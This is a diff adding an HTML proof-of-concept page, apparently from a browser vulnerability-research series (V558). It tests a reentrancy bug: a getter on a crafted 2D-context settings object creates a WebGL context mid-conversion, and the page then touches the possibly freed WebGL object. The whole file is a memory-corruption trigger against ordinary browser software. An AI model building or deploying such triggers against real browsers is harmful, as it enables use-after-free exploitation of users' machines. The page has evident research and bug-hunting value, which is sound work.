@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head><title>V558 Reverse Cross-Type Context Reentrancy</title></head>
+<body>
+<pre id="log"></pre>
+<script>
+function log(msg) {
+  document.getElementById('log').textContent += msg + '\n';
+}
+
+// V558: Reverse direction — 2d dict conversion, reentrant WebGL creation
+// The freed object here would be a WebGL context (much larger)
+
+log('V558: Reverse cross-type getContext reentrancy');
+log('==============================================');
+
+try {
+  var canvas = document.createElement('canvas');
+  canvas.width = 100;
+  canvas.height = 100;
+  document.body.appendChild(canvas);
+
+  var capturedWebGL = null;
+  var phase = 'initial';
+
+  // Malicious 2D settings dictionary
+  var maliciousSettings = {};
+  Object.defineProperty(maliciousSettings, 'alpha', {
+    get: function() {
+      if (phase === 'trigger') {
+        log('[GETTER] alpha getter during 2d dict conversion');
+        log('[GETTER] Creating WebGL context via reentrant getContext...');
+        capturedWebGL = canvas.getContext('webgl');
+        if (capturedWebGL) {
+          log('[GETTER] Got WebGL context: ' + capturedWebGL);
+        } else {
+          log('[GETTER] WebGL returned null (may be disabled)');
+        }
+      }
+      return true;
+    }
+  });
+
+  phase = 'trigger';
+  log('[MAIN] Calling canvas.getContext("2d", maliciousSettings)...');
+  var ctx2d = canvas.getContext('2d', maliciousSettings);
+  log('[MAIN] 2d context result: ' + ctx2d);
+
+  if (capturedWebGL) {
+    log('');
+    log('[CHECK] capturedWebGL JS object: ' + capturedWebGL);
+
+    // If the WebGL context was freed when m_context was overwritten by createContext2d,
+    // these operations access freed memory
+    try {
+      log('[CHECK] drawingBufferWidth: ' + capturedWebGL.drawingBufferWidth);
+    } catch(e) {
+      log('[CHECK] drawingBufferWidth threw: ' + e);
+    }
+
+    try {
+      log('[CHECK] getExtension("WEBGL_debug_renderer_info"): ' + capturedWebGL.getExtension('WEBGL_debug_renderer_info'));
+    } catch(e) {
+      log('[CHECK] getExtension threw: ' + e);
+    }
+
+    try {
+      log('[CHECK] getParameter(gl.VERSION): ' + capturedWebGL.getParameter(capturedWebGL.VERSION));
+    } catch(e) {
+      log('[CHECK] getParameter threw: ' + e);
+    }
+  }
+
+  log('');
+  log('[RESULT] ctx2d: ' + ctx2d);
+  log('[RESULT] capturedWebGL: ' + capturedWebGL);
+  log('[RESULT] Same object? ' + (ctx2d === capturedWebGL));
+
+} catch(e) {
+  log('[ERROR] ' + e.name + ': ' + e.message);
+}
+</script>
+</body>
+</html>
